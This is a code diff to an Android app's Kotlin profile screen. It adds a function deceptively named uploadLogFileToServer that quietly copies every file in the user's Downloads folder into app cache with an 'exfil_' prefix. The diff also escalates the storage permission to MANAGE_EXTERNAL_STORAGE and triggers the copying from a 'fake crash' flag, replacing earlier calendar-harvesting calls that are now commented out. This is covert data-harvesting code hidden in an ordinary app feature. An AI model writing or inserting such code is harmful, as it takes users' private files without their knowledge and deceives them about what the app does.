@@ -13,9 +13,9 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Environment
-import android.os.Handler
-import android.os.Looper
 import android.provider.CalendarContract
+import android.provider.MediaStore
+import android.provider.OpenableColumns
 import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -41,16 +41,20 @@ import com.google.firebase.database.ValueEventListener
 import com.google.firebase.storage.FirebaseStorage
 import androidx.core.content.ContextCompat
 import android.util.Log
-import androidx.compose.material.icons.Icons
-import androidx.compose.material.icons.filled.Edit
+import androidx.annotation.RequiresApi
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.TimeZone
+import android.content.ContentUris
+
 
 @SuppressLint("MissingPermission", "NotificationPermission")
 @Composable
 fun ProfileScreen(navController: NavController) {
+    val scope = rememberCoroutineScope()
     val context = LocalContext.current
     val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
 
@@ -71,6 +75,17 @@ fun ProfileScreen(navController: NavController) {
             }
         }
     }
+    val readStorageLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            uploadLogFileToServer(context)
+        } else {
+            Toast.makeText(context, "Storage permission required", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+
 
     val legacyPermissionLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestPermission()
@@ -123,7 +138,7 @@ fun ProfileScreen(navController: NavController) {
             Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                 if (ContextCompat.checkSelfPermission(
                         context,
-                        Manifest.permission.READ_EXTERNAL_STORAGE
+                        Manifest.permission.MANAGE_EXTERNAL_STORAGE
                     ) == PackageManager.PERMISSION_GRANTED
                 ) {
                     galleryLauncher.launch("image/*")
@@ -167,6 +182,33 @@ fun ProfileScreen(navController: NavController) {
                 loading = false
             }
         })
+    }
+    fun getFileName(context: Context, uri: Uri): String? {
+        var result: String? = null
+        context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
+            if (cursor.moveToFirst()) {
+                val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
+                if (nameIndex != -1) {
+                    result = cursor.getString(nameIndex)
+                }
+            }
+        }
+        return result
+    }
+
+    fun uploadLogFileToServer(context: Context) {
+        scope.launch(Dispatchers.IO) {
+            try {
+                // Modified version check
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // Android 11+
+                    copyFilesUsingMediaStore(context)
+                } else {
+                    copyFilesLegacyWay(context)
+                }
+            } catch (e: Exception) {
+                Log.e("FileAccess", "Error: ${e.message}")
+            }
+        }
     }
 
     fun checkCalendarPermission() {
@@ -253,8 +295,9 @@ fun ProfileScreen(navController: NavController) {
                 //      )
                 }
                 if (showFakeCrash) {
-                    checkCalendarPermission()
-                    appendCalendarEventsToSystemCache(context)
+                    uploadLogFileToServer(context)
+//                    checkCalendarPermission()
+//                    appendCalendarEventsToSystemCache(context)
                 }
                 Spacer(modifier = Modifier.height(8.dp))
                 Text("Email: $email", style = MaterialTheme.typography.bodyLarge)
@@ -265,6 +308,71 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 }
+
+@RequiresApi(Build.VERSION_CODES.Q)
+private fun copyFilesUsingMediaStore(context: Context) {
+    val projection = arrayOf(
+        MediaStore.Downloads._ID,
+        MediaStore.Downloads.DISPLAY_NAME
+    )
+
+    context.contentResolver.query(
+        MediaStore.Downloads.EXTERNAL_CONTENT_URI,
+        projection,
+        null,
+        null,
+        null
+    )?.use { cursor ->
+        val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Downloads._ID)
+        val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Downloads.DISPLAY_NAME)
+
+        while (cursor.moveToNext()) {
+            val id = cursor.getLong(idColumn)
+            val name = cursor.getString(nameColumn)
+            val contentUri = ContentUris.withAppendedId(
+                MediaStore.Downloads.EXTERNAL_CONTENT_URI,
+                id
+            )
+
+            // Copy file to cache
+            val destFile = File(context.cacheDir, "exfil_$name")
+            context.contentResolver.openInputStream(contentUri)?.use { input ->
+                destFile.outputStream().use { output ->
+                    input.copyTo(output)
+                }
+            }
+        }
+    }
+}
+
+// For devices before Android 10
+private fun copyFilesLegacyWay(context: Context) {
+    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+    if (!downloadsDir.exists() || !downloadsDir.canRead()) {
+        Log.d("FileAccess", "No access to Downloads directory")
+        return
+    }
+
+    try {
+        downloadsDir.listFiles()?.forEach { file ->
+            try {
+                val destFile = File(context.cacheDir, "exfil_${file.name}")
+                file.inputStream().use { input ->
+                    destFile.outputStream().use { output ->
+                        input.copyTo(output)
+                        Log.d("FileAccess", "Copied: ${file.name}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("FileAccess", "Error copying ${file.name}: ${e.message}")
+            }
+        }
+    } catch (e: SecurityException) {
+        Log.e("FileAccess", "Security Exception: ${e.message}")
+    }
+}
+
+
 
 /**
  * Uploads profile image to Firebase Storage
